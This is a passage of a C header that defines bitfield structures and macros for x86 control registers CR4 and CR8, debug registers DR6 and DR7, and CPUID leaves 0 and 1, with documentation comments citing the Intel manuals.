     * [Bit 17] Enables process-context identifiers (PCIDs) when set. Can be set only in IA-32e mode
     * (if IA32_EFER.LMA = 1).
     *
     * @see Vol3A[4.10.1(Process-Context Identifiers (PCIDs))]
     */
    UINT64 PcidEnable : 1;
#define CR4_PCID_ENABLE_BIT 17
#define CR4_PCID_ENABLE_FLAG 0x20000
#define CR4_PCID_ENABLE_MASK 0x01
#define CR4_PCID_ENABLE(_) (((_) >> 17) & 0x01)

    /**
     * @brief XSAVE and Processor Extended States-Enable
     *
     * [Bit 18] When set, this flag:
     * -# indicates (via CPUID.01H:ECX.OSXSAVE[bit 27]) that the operating system supports the use
     * of the XGETBV, XSAVE and XRSTOR instructions by general software;
     * -# enables the XSAVE and XRSTOR instructions to save and restore the x87 FPU state (including
     * MMX registers), the SSE state (XMM registers and MXCSR), along with other processor extended
     * states enabled in XCR0;
     * -# enables the processor to execute XGETBV and XSETBV instructions in order to read and write
     * XCR0.
     *
     * @see Vol3A[2.6(EXTENDED CONTROL REGISTERS (INCLUDING XCR0))]
     * @see Vol3A[13(SYSTEM PROGRAMMING FOR INSTRUCTION SET EXTENSIONS AND PROCESSOR EXTENDED)]
     */
    UINT64 OsXsave : 1;
#define CR4_OS_XSAVE_BIT 18
#define CR4_OS_XSAVE_FLAG 0x40000
#define CR4_OS_XSAVE_MASK 0x01
#define CR4_OS_XSAVE(_) (((_) >> 18) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * @brief SMEP-Enable
     *
     * [Bit 20] Enables supervisor-mode execution prevention (SMEP) when set.
     *
     * @see Vol3A[4.6(ACCESS RIGHTS)]
     */
    UINT64 SmepEnable : 1;
#define CR4_SMEP_ENABLE_BIT 20
#define CR4_SMEP_ENABLE_FLAG 0x100000
#define CR4_SMEP_ENABLE_MASK 0x01
#define CR4_SMEP_ENABLE(_) (((_) >> 20) & 0x01)

    /**
     * @brief SMAP-Enable
     *
     * [Bit 21] Enables supervisor-mode access prevention (SMAP) when set.
     *
     * @see Vol3A[4.6(ACCESS RIGHTS)]
     */
    UINT64 SmapEnable : 1;
#define CR4_SMAP_ENABLE_BIT 21
#define CR4_SMAP_ENABLE_FLAG 0x200000
#define CR4_SMAP_ENABLE_MASK 0x01
#define CR4_SMAP_ENABLE(_) (((_) >> 21) & 0x01)

    /**
     * @brief Protection-Key-Enable
     *
     * [Bit 22] Enables 4-level paging to associate each linear address with a protection key. The
     * PKRU register specifies, for each protection key, whether user-mode linear addresses with
     * that protection key can be read or written. This bit also enables access to the PKRU register
     * using the RDPKRU and WRPKRU instructions.
     */
    UINT64 ProtectionKeyEnable : 1;
#define CR4_PROTECTION_KEY_ENABLE_BIT 22
#define CR4_PROTECTION_KEY_ENABLE_FLAG 0x400000
#define CR4_PROTECTION_KEY_ENABLE_MASK 0x01
#define CR4_PROTECTION_KEY_ENABLE(_) (((_) >> 22) & 0x01)
    UINT64 Reserved4 : 41;
  };

  UINT64 Flags;
} CR4;

typedef union {
  struct {
    /**
     * @brief Task Priority Level
     *
     * [Bits 3:0] This sets the threshold value corresponding to the highestpriority interrupt to be
     * blocked. A value of 0 means all interrupts are enabled. This field is available in 64- bit
     * mode. A value of 15 means all interrupts will be disabled.
     */
    UINT64 TaskPriorityLevel : 4;
#define CR8_TASK_PRIORITY_LEVEL_BIT 0
#define CR8_TASK_PRIORITY_LEVEL_FLAG 0x0F
#define CR8_TASK_PRIORITY_LEVEL_MASK 0x0F
#define CR8_TASK_PRIORITY_LEVEL(_) (((_) >> 0) & 0x0F)

    /**
     * @brief Reserved
     *
     * [Bits 63:4] Reserved and must be written with zeros. Failure to do this causes a
     * general-protection exception.
     */
    UINT64 Reserved : 60;
#define CR8_RESERVED_BIT 4
#define CR8_RESERVED_FLAG 0xFFFFFFFFFFFFFFF0
#define CR8_RESERVED_MASK 0xFFFFFFFFFFFFFFF
#define CR8_RESERVED(_) (((_) >> 4) & 0xFFFFFFFFFFFFFFF)
  };

  UINT64 Flags;
} CR8;

/**
 * @}
 */

/**
 * @defgroup DEBUG_REGISTERS \
 *           Debug registers
 *
 * Eight debug registers control the debug operation of the processor. These registers can be
 * written to and read using the move to/from debug register form of the MOV instruction. A debug
 * register may be the source or destination operand for one of these instructions. Debug registers
 * are privileged resources; a MOV instruction that accesses these registers can only be executed in
 * real-address mode, in SMM or in protected mode at a CPL of 0. An attempt to read or write the
 * debug registers from any other privilege level generates a general-protection exception (\#GP).
 * The primary function of the debug registers is to set up and monitor from 1 to 4 breakpoints,
 * numbered 0 though 3. For each breakpoint, the following information can be specified:
 * - The linear address where the breakpoint is to occur.
 * - The length of the breakpoint location: 1, 2, 4, or 8 bytes.
 * - The operation that must be performed at the address for a debug exception to be generated.
 * - Whether the breakpoint is enabled.
 * - Whether the breakpoint condition was present when the debug exception was generated.
 *
 * @see Vol3B[17.2.4(Debug Control Register (DR7))]
 * @see Vol3B[17.2(DEBUG REGISTERS)] (reference)
 * @{
 */
typedef union {
  struct {
    /**
     * @brief B0 through B3 (breakpoint condition detected) flags
     *
     * [Bits 3:0] Indicates (when set) that its associated breakpoint condition was met when a debug
     * exception was generated. These flags are set if the condition described for each breakpoint
     * by the LENn, and R/Wn flags in debug control register DR7 is true. They may or may not be set
     * if the breakpoint is not enabled by the Ln or the Gn flags in register DR7. Therefore on a
     * \#DB, a debug handler should check only those B0-B3 bits which correspond to an enabled
     * breakpoint.
     */
    UINT64 BreakpointCondition : 4;
#define DR6_BREAKPOINT_CONDITION_BIT 0
#define DR6_BREAKPOINT_CONDITION_FLAG 0x0F
#define DR6_BREAKPOINT_CONDITION_MASK 0x0F
#define DR6_BREAKPOINT_CONDITION(_) (((_) >> 0) & 0x0F)
    UINT64 Reserved1 : 9;

    /**
     * @brief BD (debug register access detected) flag
     *
     * [Bit 13] Indicates that the next instruction in the instruction stream accesses one of the
     * debug registers (DR0 through DR7). This flag is enabled when the GD (general detect) flag in
     * debug control register DR7 is set.
     *
     * @see Vol3B[17.2.4(Debug Control Register (DR7))]
     */
    UINT64 DebugRegisterAccessDetected : 1;
#define DR6_DEBUG_REGISTER_ACCESS_DETECTED_BIT 13
#define DR6_DEBUG_REGISTER_ACCESS_DETECTED_FLAG 0x2000
#define DR6_DEBUG_REGISTER_ACCESS_DETECTED_MASK 0x01
#define DR6_DEBUG_REGISTER_ACCESS_DETECTED(_) (((_) >> 13) & 0x01)

    /**
     * @brief BS (single step) flag
     *
     * [Bit 14] Indicates (when set) that the debug exception was triggered by the singlestep
     * execution mode (enabled with the TF flag in the EFLAGS register). The single-step mode is the
     * highestpriority debug exception. When the BS flag is set, any of the other debug status bits
     * also may be set.
     */
    UINT64 SingleInstruction : 1;
#define DR6_SINGLE_INSTRUCTION_BIT 14
#define DR6_SINGLE_INSTRUCTION_FLAG 0x4000
#define DR6_SINGLE_INSTRUCTION_MASK 0x01
#define DR6_SINGLE_INSTRUCTION(_) (((_) >> 14) & 0x01)

    /**
     * @brief BT (task switch) flag
     *
     * [Bit 15] Indicates (when set) that the debug exception was triggered by the singlestep
     * execution mode (enabled with the TF flag in the EFLAGS register). The single-step mode is the
     * highestpriority debug exception. When the BS flag is set, any of the other debug status bits
     * also may be set.
     */
    UINT64 TaskSwitch : 1;
#define DR6_TASK_SWITCH_BIT 15
#define DR6_TASK_SWITCH_FLAG 0x8000
#define DR6_TASK_SWITCH_MASK 0x01
#define DR6_TASK_SWITCH(_) (((_) >> 15) & 0x01)

    /**
     * @brief RTM (restricted transactional memory) flag
     *
     * [Bit 16] Indicates (when clear) that a debug exception (\#DB) or breakpoint exception (\#BP)
     * occurred inside an RTM region while advanced debugging of RTM transactional regions was
     * enabled. This bit is set for any other debug exception (including all those that occur when
     * advanced debugging of RTM transactional regions is not enabled). This bit is always 1 if the
     * processor does not support RTM.
     *
     * @see Vol3B[17.3.3(Debug Exceptions, Breakpoint Exceptions, and Restricted Transactional
     * Memory (RTM))]
     */
    UINT64 RestrictedTransactionalMemory : 1;
#define DR6_RESTRICTED_TRANSACTIONAL_MEMORY_BIT 16
#define DR6_RESTRICTED_TRANSACTIONAL_MEMORY_FLAG 0x10000
#define DR6_RESTRICTED_TRANSACTIONAL_MEMORY_MASK 0x01
#define DR6_RESTRICTED_TRANSACTIONAL_MEMORY(_) (((_) >> 16) & 0x01)
    UINT64 Reserved2 : 47;
  };

  UINT64 Flags;
} DR6;

typedef union {
  struct {
    /**
     * @brief L0 through L3 (local breakpoint enable) flags (bits 0, 2, 4, and 6)
     *
     * [Bit 0] Enables (when set) the breakpoint condition for the associated breakpoint for the
     * current task. When a breakpoint condition is detected and its associated Ln flag is set, a
     * debug exception is generated. The processor automatically clears these flags on every task
     * switch to avoid unwanted breakpoint conditions in the new task.
     */
    UINT64 LocalBreakpoint0 : 1;
#define DR7_LOCAL_BREAKPOINT_0_BIT 0
#define DR7_LOCAL_BREAKPOINT_0_FLAG 0x01
#define DR7_LOCAL_BREAKPOINT_0_MASK 0x01
#define DR7_LOCAL_BREAKPOINT_0(_) (((_) >> 0) & 0x01)

    /**
     * @brief G0 through G3 (global breakpoint enable) flags (bits 1, 3, 5, and 7)
     *
     * [Bit 1] Enables (when set) the breakpoint condition for the associated breakpoint for all
     * tasks. When a breakpoint condition is detected and its associated Gn flag is set, a debug
     * exception is generated. The processor does not clear these flags on a task switch, allowing a
     * breakpoint to be enabled for all tasks.
     */
    UINT64 GlobalBreakpoint0 : 1;
#define DR7_GLOBAL_BREAKPOINT_0_BIT 1
#define DR7_GLOBAL_BREAKPOINT_0_FLAG 0x02
#define DR7_GLOBAL_BREAKPOINT_0_MASK 0x01
#define DR7_GLOBAL_BREAKPOINT_0(_) (((_) >> 1) & 0x01)
    UINT64 LocalBreakpoint1 : 1;
#define DR7_LOCAL_BREAKPOINT_1_BIT 2
#define DR7_LOCAL_BREAKPOINT_1_FLAG 0x04
#define DR7_LOCAL_BREAKPOINT_1_MASK 0x01
#define DR7_LOCAL_BREAKPOINT_1(_) (((_) >> 2) & 0x01)
    UINT64 GlobalBreakpoint1 : 1;
#define DR7_GLOBAL_BREAKPOINT_1_BIT 3
#define DR7_GLOBAL_BREAKPOINT_1_FLAG 0x08
#define DR7_GLOBAL_BREAKPOINT_1_MASK 0x01
#define DR7_GLOBAL_BREAKPOINT_1(_) (((_) >> 3) & 0x01)
    UINT64 LocalBreakpoint2 : 1;
#define DR7_LOCAL_BREAKPOINT_2_BIT 4
#define DR7_LOCAL_BREAKPOINT_2_FLAG 0x10
#define DR7_LOCAL_BREAKPOINT_2_MASK 0x01
#define DR7_LOCAL_BREAKPOINT_2(_) (((_) >> 4) & 0x01)
    UINT64 GlobalBreakpoint2 : 1;
#define DR7_GLOBAL_BREAKPOINT_2_BIT 5
#define DR7_GLOBAL_BREAKPOINT_2_FLAG 0x20
#define DR7_GLOBAL_BREAKPOINT_2_MASK 0x01
#define DR7_GLOBAL_BREAKPOINT_2(_) (((_) >> 5) & 0x01)
    UINT64 LocalBreakpoint3 : 1;
#define DR7_LOCAL_BREAKPOINT_3_BIT 6
#define DR7_LOCAL_BREAKPOINT_3_FLAG 0x40
#define DR7_LOCAL_BREAKPOINT_3_MASK 0x01
#define DR7_LOCAL_BREAKPOINT_3(_) (((_) >> 6) & 0x01)
    UINT64 GlobalBreakpoint3 : 1;
#define DR7_GLOBAL_BREAKPOINT_3_BIT 7
#define DR7_GLOBAL_BREAKPOINT_3_FLAG 0x80
#define DR7_GLOBAL_BREAKPOINT_3_MASK 0x01
#define DR7_GLOBAL_BREAKPOINT_3(_) (((_) >> 7) & 0x01)

    /**
     * @brief LE (local exact breakpoint enable)
     *
     * [Bit 8] This feature is not supported in the P6 family processors, later IA-32 processors,
     * and Intel 64 processors. When set, these flags cause the processor to detect the exact
     * instruction that caused a data breakpoint condition. For backward and forward compatibility
     * with other Intel processors, we recommend that the LE and GE flags be set to 1 if exact
     * breakpoints are required.
     */
    UINT64 LocalExactBreakpoint : 1;
#define DR7_LOCAL_EXACT_BREAKPOINT_BIT 8
#define DR7_LOCAL_EXACT_BREAKPOINT_FLAG 0x100
#define DR7_LOCAL_EXACT_BREAKPOINT_MASK 0x01
#define DR7_LOCAL_EXACT_BREAKPOINT(_) (((_) >> 8) & 0x01)
    UINT64 GlobalExactBreakpoint : 1;
#define DR7_GLOBAL_EXACT_BREAKPOINT_BIT 9
#define DR7_GLOBAL_EXACT_BREAKPOINT_FLAG 0x200
#define DR7_GLOBAL_EXACT_BREAKPOINT_MASK 0x01
#define DR7_GLOBAL_EXACT_BREAKPOINT(_) (((_) >> 9) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * @brief RTM (restricted transactional memory) flag
     *
     * [Bit 11] Enables (when set) advanced debugging of RTM transactional regions. This advanced
     * debugging is enabled only if IA32_DEBUGCTL.RTM is also set.
     *
     * @see Vol3B[17.3.3(Debug Exceptions, Breakpoint Exceptions, and Restricted Transactional
     * Memory (RTM))]
     */
    UINT64 RestrictedTransactionalMemory : 1;
#define DR7_RESTRICTED_TRANSACTIONAL_MEMORY_BIT 11
#define DR7_RESTRICTED_TRANSACTIONAL_MEMORY_FLAG 0x800
#define DR7_RESTRICTED_TRANSACTIONAL_MEMORY_MASK 0x01
#define DR7_RESTRICTED_TRANSACTIONAL_MEMORY(_) (((_) >> 11) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * @brief GD (general detect enable) flag
     *
     * [Bit 13] Enables (when set) debug-register protection, which causes a debug exception to be
     * generated prior to any MOV instruction that accesses a debug register. When such a condition
     * is detected, the BD flag in debug status register DR6 is set prior to generating the
     * exception. This condition is provided to support in-circuit emulators. When the emulator
     * needs to access the debug registers, emulator software can set the GD flag to prevent
     * interference from the program currently executing on the processor. The processor clears the
     * GD flag upon entering to the debug exception handler, to allow the handler access to the
     * debug registers.
     */
    UINT64 GeneralDetect : 1;
#define DR7_GENERAL_DETECT_BIT 13
#define DR7_GENERAL_DETECT_FLAG 0x2000
#define DR7_GENERAL_DETECT_MASK 0x01
#define DR7_GENERAL_DETECT(_) (((_) >> 13) & 0x01)
    UINT64 Reserved3 : 2;

    /**
     * @brief R/W0 through R/W3 (read/write) fields (bits 16, 17, 20, 21, 24, 25, 28, and 29)
     *
     * [Bits 17:16] Specifies the breakpoint condition for the corresponding breakpoint. The DE
     * (debug extensions) flag in control register CR4 determines how the bits in the R/Wn fields
     * are interpreted. When the DE flag is set, the processor interprets bits as follows:
     * - 00 - Break on instruction execution only.
     * - 01 - Break on data writes only.
     * - 10 - Break on I/O reads or writes.
     * - 11 - Break on data reads or writes but not instruction fetches.
     * When the DE flag is clear, the processor interprets the R/Wn bits the same as for the
     * Intel386(TM) and Intel486(TM) processors, which is as follows:
     * - 00 - Break on instruction execution only.
     * - 01 - Break on data writes only.
     * - 10 - Undefined.
     * - 11 - Break on data reads or writes but not instruction fetches.
     */
    UINT64 ReadWrite0 : 2;
#define DR7_READ_WRITE_0_BIT 16
#define DR7_READ_WRITE_0_FLAG 0x30000
#define DR7_READ_WRITE_0_MASK 0x03
#define DR7_READ_WRITE_0(_) (((_) >> 16) & 0x03)

    /**
     * @brief LEN0 through LEN3 (Length) fields (bits 18, 19, 22, 23, 26, 27, 30, and 31)
     *
     * [Bits 19:18] Specify the size of the memory location at the address specified in the
     * corresponding breakpoint address register (DR0 through DR3). These fields are interpreted as
     * follows:
     * - 00 - 1-byte length.
     * - 01 - 2-byte length.
     * - 10 - Undefined (or 8 byte length, see note below).
     * - 11 - 4-byte length.
     * If the corresponding RWn field in register DR7 is 00 (instruction execution), then the LENn
     * field should also be 00. The effect of using other lengths is undefined.
     *
     * @see Vol3B[17.2.5(Breakpoint Field Recognition)]
     */
    UINT64 Length0 : 2;
#define DR7_LENGTH_0_BIT 18
#define DR7_LENGTH_0_FLAG 0xC0000
#define DR7_LENGTH_0_MASK 0x03
#define DR7_LENGTH_0(_) (((_) >> 18) & 0x03)
    UINT64 ReadWrite1 : 2;
#define DR7_READ_WRITE_1_BIT 20
#define DR7_READ_WRITE_1_FLAG 0x300000
#define DR7_READ_WRITE_1_MASK 0x03
#define DR7_READ_WRITE_1(_) (((_) >> 20) & 0x03)
    UINT64 Length1 : 2;
#define DR7_LENGTH_1_BIT 22
#define DR7_LENGTH_1_FLAG 0xC00000
#define DR7_LENGTH_1_MASK 0x03
#define DR7_LENGTH_1(_) (((_) >> 22) & 0x03)
    UINT64 ReadWrite2 : 2;
#define DR7_READ_WRITE_2_BIT 24
#define DR7_READ_WRITE_2_FLAG 0x3000000
#define DR7_READ_WRITE_2_MASK 0x03
#define DR7_READ_WRITE_2(_) (((_) >> 24) & 0x03)
    UINT64 Length2 : 2;
#define DR7_LENGTH_2_BIT 26
#define DR7_LENGTH_2_FLAG 0xC000000
#define DR7_LENGTH_2_MASK 0x03
#define DR7_LENGTH_2(_) (((_) >> 26) & 0x03)
    UINT64 ReadWrite3 : 2;
#define DR7_READ_WRITE_3_BIT 28
#define DR7_READ_WRITE_3_FLAG 0x30000000
#define DR7_READ_WRITE_3_MASK 0x03
#define DR7_READ_WRITE_3(_) (((_) >> 28) & 0x03)
    UINT64 Length3 : 2;
#define DR7_LENGTH_3_BIT 30
#define DR7_LENGTH_3_FLAG 0xC0000000
#define DR7_LENGTH_3_MASK 0x03
#define DR7_LENGTH_3(_) (((_) >> 30) & 0x03)
    UINT64 Reserved4 : 32;
  };

  UINT64 Flags;
} DR7;

/**
 * @}
 */

/**
 * @defgroup CPUID \
 *           CPUID
 *
 * @see Vol2A[3.2(CPUID)] (reference)
 * @{
 */
/**
 * @brief Returns CPUID's Highest Value for Basic Processor Information and the Vendor
 * Identification String
 *
 * When CPUID executes with EAX set to 0, the processor returns the highest value the CPUID
 * recognizes for returning basic processor information. The value is returned in the EAX register
 * and is processor specific. A vendor identification string is also returned in EBX, EDX, and ECX.
 * For Intel processors, the string is "GenuineIntel" and is expressed:
 * - EBX <- 756e6547h (* "Genu", with G in the low eight bits of BL *)
 * - EDX <- 49656e69h (* "ineI", with i in the low eight bits of DL *)
 * - ECX <- 6c65746eh (* "ntel", with n in the low eight bits of CL *)
 */
#define CPUID_SIGNATURE 0x00000000
typedef struct {
  /**
   * @brief EAX
   *
   * Maximum Input Value for Basic CPUID Information.
   */
  UINT32 MaxCpuidInputValue;

  /**
   * @brief EBX
   *
   * "Genu"
   */
  UINT32 EbxValueGenu;

  /**
   * @brief ECX
   *
   * "ntel"
   */
  UINT32 EcxValueNtel;

  /**
   * @brief EDX
   *
   * "ineI"
   */
  UINT32 EdxValueInei;
} CPUID_EAX_00;

/**
 * @brief Returns Model, Family, Stepping Information, Additional Information and Feature
 * Information
 *
 * Returns:
 *   * Model, Family, Stepping Information in EAX
 *   * Additional Information in EBX
 *   * Feature Information in ECX and EDX
 */
#define CPUID_VERSION_INFORMATION 0x00000001
typedef struct {
  /**
   * @brief When CPUID executes with EAX set to 01H, version information is returned in EAX
   */
  union {
    struct {
      UINT32 SteppingId : 4;
#define CPUID_VERSION_INFORMATION_STEPPING_ID_BIT 0
#define CPUID_VERSION_INFORMATION_STEPPING_ID_FLAG 0x0F
#define CPUID_VERSION_INFORMATION_STEPPING_ID_MASK 0x0F
#define CPUID_VERSION_INFORMATION_STEPPING_ID(_) (((_) >> 0) & 0x0F)
      UINT32 Model : 4;
#define CPUID_VERSION_INFORMATION_MODEL_BIT 4
#define CPUID_VERSION_INFORMATION_MODEL_FLAG 0xF0
#define CPUID_VERSION_INFORMATION_MODEL_MASK 0x0F
#define CPUID_VERSION_INFORMATION_MODEL(_) (((_) >> 4) & 0x0F)
      UINT32 FamilyId : 4;
#define CPUID_VERSION_INFORMATION_FAMILY_ID_BIT 8
#define CPUID_VERSION_INFORMATION_FAMILY_ID_FLAG 0xF00
#define CPUID_VERSION_INFORMATION_FAMILY_ID_MASK 0x0F
#define CPUID_VERSION_INFORMATION_FAMILY_ID(_) (((_) >> 8) & 0x0F)

      /**
       * [Bits 13:12] - 0 - Original OEM Processor
       * - 1 - Intel OverDrive(R) Processor
       * - 2 - Dual processor (not applicable to Intel486 processors)
       * - 3 - Intel reserved
       */
      UINT32 ProcessorType : 2;
#define CPUID_VERSION_INFORMATION_PROCESSOR_TYPE_BIT 12
#define CPUID_VERSION_INFORMATION_PROCESSOR_TYPE_FLAG 0x3000
#define CPUID_VERSION_INFORMATION_PROCESSOR_TYPE_MASK 0x03
#define CPUID_VERSION_INFORMATION_PROCESSOR_TYPE(_) (((_) >> 12) & 0x03)
      UINT32 Reserved1 : 2;

      /**
       * [Bits 19:16] The Extended Model ID needs to be examined only when the Family ID is 06H or
       * 0FH.
       */
      UINT32 ExtendedModelId : 4;
#define CPUID_VERSION_INFORMATION_EXTENDED_MODEL_ID_BIT 16
#define CPUID_VERSION_INFORMATION_EXTENDED_MODEL_ID_FLAG 0xF0000
#define CPUID_VERSION_INFORMATION_EXTENDED_MODEL_ID_MASK 0x0F
#define CPUID_VERSION_INFORMATION_EXTENDED_MODEL_ID(_) (((_) >> 16) & 0x0F)

      /**
       * [Bits 27:20] The Extended Family ID needs to be examined only when the Family ID is 0FH.
       */
      UINT32 ExtendedFamilyId : 8;
#define CPUID_VERSION_INFORMATION_EXTENDED_FAMILY_ID_BIT 20
#define CPUID_VERSION_INFORMATION_EXTENDED_FAMILY_ID_FLAG 0xFF00000
#define CPUID_VERSION_INFORMATION_EXTENDED_FAMILY_ID_MASK 0xFF
#define CPUID_VERSION_INFORMATION_EXTENDED_FAMILY_ID(_) (((_) >> 20) & 0xFF)
      UINT32 Reserved2 : 4;
    };

    UINT32 Flags;
  } CpuidVersionInformation;

  /**
   * @brief When CPUID executes with EAX set to 01H, additional information is returned to the EBX
   * register
   */
  union {
    struct {
      /**
       * [Bits 7:0] This number provides an entry into a brand string table that contains brand
       * strings for IA-32 processors. More information about this field is provided later in this
       * section.
       */
      UINT32 BrandIndex : 8;
#define CPUID_ADDITIONAL_INFORMATION_BRAND_INDEX_BIT 0
#define CPUID_ADDITIONAL_INFORMATION_BRAND_INDEX_FLAG 0xFF
#define CPUID_ADDITIONAL_INFORMATION_BRAND_INDEX_MASK 0xFF
#define CPUID_ADDITIONAL_INFORMATION_BRAND_INDEX(_) (((_) >> 0) & 0xFF)

      /**
       * @brief Value * 8 = cache line size in bytes; used also by CLFLUSHOPT
       *
       * [Bits 15:8] This number indicates the size of the cache line flushed by the CLFLUSH and
       * CLFLUSHOPT instructions in 8-byte increments. This field was introduced in the Pentium 4
       * processor.
       */
      UINT32 ClflushLineSize : 8;
#define CPUID_ADDITIONAL_INFORMATION_CLFLUSH_LINE_SIZE_BIT 8
#define CPUID_ADDITIONAL_INFORMATION_CLFLUSH_LINE_SIZE_FLAG 0xFF00
#define CPUID_ADDITIONAL_INFORMATION_CLFLUSH_LINE_SIZE_MASK 0xFF
#define CPUID_ADDITIONAL_INFORMATION_CLFLUSH_LINE_SIZE(_) (((_) >> 8) & 0xFF)

      /**
       * [Bits 23:16] Maximum number of addressable IDs for logical processors in this physical
       * package.
       *
       * @remarks The nearest power-of-2 integer that is not smaller than EBX[23:16] is the number
       * of unique initial APIC IDs reserved for addressing different logical processors in a
       * physical package. This field is only valid if CPUID.1.EDX.HTT[bit 28] = 1.
       */
      UINT32 MaxAddressableIds : 8;
#define CPUID_ADDITIONAL_INFORMATION_MAX_ADDRESSABLE_IDS_BIT 16
#define CPUID_ADDITIONAL_INFORMATION_MAX_ADDRESSABLE_IDS_FLAG 0xFF0000
#define CPUID_ADDITIONAL_INFORMATION_MAX_ADDRESSABLE_IDS_MASK 0xFF
#define CPUID_ADDITIONAL_INFORMATION_MAX_ADDRESSABLE_IDS(_) (((_) >> 16) & 0xFF)

      /**
       * [Bits 31:24] This number is the 8-bit ID that is assigned to the local APIC on the
       * processor during power up. This field was introduced in the Pentium 4 processor.
       */
      UINT32 InitialApicId : 8;
#define CPUID_ADDITIONAL_INFORMATION_INITIAL_APIC_ID_BIT 24
#define CPUID_ADDITIONAL_INFORMATION_INITIAL_APIC_ID_FLAG 0xFF000000
#define CPUID_ADDITIONAL_INFORMATION_INITIAL_APIC_ID_MASK 0xFF
#define CPUID_ADDITIONAL_INFORMATION_INITIAL_APIC_ID(_) (((_) >> 24) & 0xFF)
    };

    UINT32 Flags;
  } CpuidAdditionalInformation;

  /**
   * @brief When CPUID executes with EAX set to 01H, feature information is returned in ECX and EDX
   */
  union {
    struct {
      /**
       * @brief Streaming SIMD Extensions 3 (SSE3)
       *
       * [Bit 0] A value of 1 indicates the processor supports this technology.
       */
      UINT32 StreamingSimdExtensions3 : 1;
#define CPUID_FEATURE_INFORMATION_ECX_STREAMING_SIMD_EXTENSIONS_3_BIT 0
#define CPUID_FEATURE_INFORMATION_ECX_STREAMING_SIMD_EXTENSIONS_3_FLAG 0x01
#define CPUID_FEATURE_INFORMATION_ECX_STREAMING_SIMD_EXTENSIONS_3_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_STREAMING_SIMD_EXTENSIONS_3(_) (((_) >> 0) & 0x01)

      /**
       * @brief PCLMULQDQ instruction
       *
       * [Bit 1] A value of 1 indicates the processor supports the PCLMULQDQ instruction.
       */
      UINT32 PclmulqdqInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_PCLMULQDQ_INSTRUCTION_BIT 1
#define CPUID_FEATURE_INFORMATION_ECX_PCLMULQDQ_INSTRUCTION_FLAG 0x02
#define CPUID_FEATURE_INFORMATION_ECX_PCLMULQDQ_INSTRUCTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_PCLMULQDQ_INSTRUCTION(_) (((_) >> 1) & 0x01)

      /**
       * @brief 64-bit DS Area
       *
       * [Bit 2] A value of 1 indicates the processor supports DS area using 64-bit layout.
       */
      UINT32 DsArea64BitLayout : 1;
#define CPUID_FEATURE_INFORMATION_ECX_DS_AREA_64BIT_LAYOUT_BIT 2
#define CPUID_FEATURE_INFORMATION_ECX_DS_AREA_64BIT_LAYOUT_FLAG 0x04
#define CPUID_FEATURE_INFORMATION_ECX_DS_AREA_64BIT_LAYOUT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_DS_AREA_64BIT_LAYOUT(_) (((_) >> 2) & 0x01)

      /**
       * @brief MONITOR/MWAIT instruction
       *
       * [Bit 3] A value of 1 indicates the processor supports this feature.
       */
      UINT32 MonitorMwaitInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_MONITOR_MWAIT_INSTRUCTION_BIT 3
#define CPUID_FEATURE_INFORMATION_ECX_MONITOR_MWAIT_INSTRUCTION_FLAG 0x08
#define CPUID_FEATURE_INFORMATION_ECX_MONITOR_MWAIT_INSTRUCTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_MONITOR_MWAIT_INSTRUCTION(_) (((_) >> 3) & 0x01)

      /**
       * @brief CPL Qualified Debug Store
       *
       * [Bit 4] A value of 1 indicates the processor supports the extensions to the Debug Store
       * feature to allow for branch message storage qualified by CPL.
       */
      UINT32 CplQualifiedDebugStore : 1;
#define CPUID_FEATURE_INFORMATION_ECX_CPL_QUALIFIED_DEBUG_STORE_BIT 4
#define CPUID_FEATURE_INFORMATION_ECX_CPL_QUALIFIED_DEBUG_STORE_FLAG 0x10
#define CPUID_FEATURE_INFORMATION_ECX_CPL_QUALIFIED_DEBUG_STORE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_CPL_QUALIFIED_DEBUG_STORE(_) (((_) >> 4) & 0x01)

      /**
       * @brief Virtual Machine Extensions
       *
       * [Bit 5] A value of 1 indicates that the processor supports this technology.
       */
      UINT32 VirtualMachineExtensions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_VIRTUAL_MACHINE_EXTENSIONS_BIT 5
#define CPUID_FEATURE_INFORMATION_ECX_VIRTUAL_MACHINE_EXTENSIONS_FLAG 0x20
#define CPUID_FEATURE_INFORMATION_ECX_VIRTUAL_MACHINE_EXTENSIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_VIRTUAL_MACHINE_EXTENSIONS(_) (((_) >> 5) & 0x01)

      /**
       * @brief Safer Mode Extensions
       *
       * [Bit 6] A value of 1 indicates that the processor supports this technology.
       *
       * @see Vol2[6(SAFER MODE EXTENSIONS REFERENCE)]
       */
      UINT32 SaferModeExtensions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SAFER_MODE_EXTENSIONS_BIT 6
#define CPUID_FEATURE_INFORMATION_ECX_SAFER_MODE_EXTENSIONS_FLAG 0x40
#define CPUID_FEATURE_INFORMATION_ECX_SAFER_MODE_EXTENSIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_SAFER_MODE_EXTENSIONS(_) (((_) >> 6) & 0x01)

      /**
       * @brief Enhanced Intel SpeedStep(R) technology
       *
       * [Bit 7] A value of 1 indicates that the processor supports this technology.
       */
      UINT32 EnhancedIntelSpeedstepTechnology : 1;
#define CPUID_FEATURE_INFORMATION_ECX_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_BIT 7
#define CPUID_FEATURE_INFORMATION_ECX_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_FLAG 0x80
#define CPUID_FEATURE_INFORMATION_ECX_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY(_) (((_) >> 7) & 0x01)

      /**
       * @brief Thermal Monitor 2
       *
       * [Bit 8] A value of 1 indicates whether the processor supports this technology.
       */
      UINT32 ThermalMonitor2 : 1;
#define CPUID_FEATURE_INFORMATION_ECX_THERMAL_MONITOR_2_BIT 8
#define CPUID_FEATURE_INFORMATION_ECX_THERMAL_MONITOR_2_FLAG 0x100
